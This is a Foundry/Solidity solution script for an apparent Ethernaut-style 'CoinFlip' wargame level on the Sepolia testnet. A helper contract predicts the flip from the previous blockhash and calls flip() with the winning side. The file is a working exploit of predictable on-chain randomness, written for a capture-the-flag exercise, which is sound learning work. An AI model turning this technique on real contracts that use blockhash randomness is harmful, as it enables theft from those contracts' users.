// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level3CoinFlip.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

// Objective: guess the correct outcome 10 times in a row.

contract Player {
    uint256 constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip public coinFlipContract;

    constructor(address _coinFlipContract) {
        coinFlipContract = CoinFlip(_coinFlipContract);
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        coinFlipContract.flip(side);
    }
}

contract Level3Solution is Script {
    CoinFlip public coinFlipContract =
        CoinFlip(0x5fD63c13e853FC4aa17b88D04E9E98eb7CEf5358);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        new Player(address(coinFlipContract));
        console.log("Consecutive Wins: ", coinFlipContract.consecutiveWins());

        vm.stopBroadcast();
    }
}
// forge script script/Level3Solution.s.sol:Level3Solution --broadcast -vvvv --rpc-url sepolia --etherscan-api-key "${ETHERSCAN_API_KEY}"
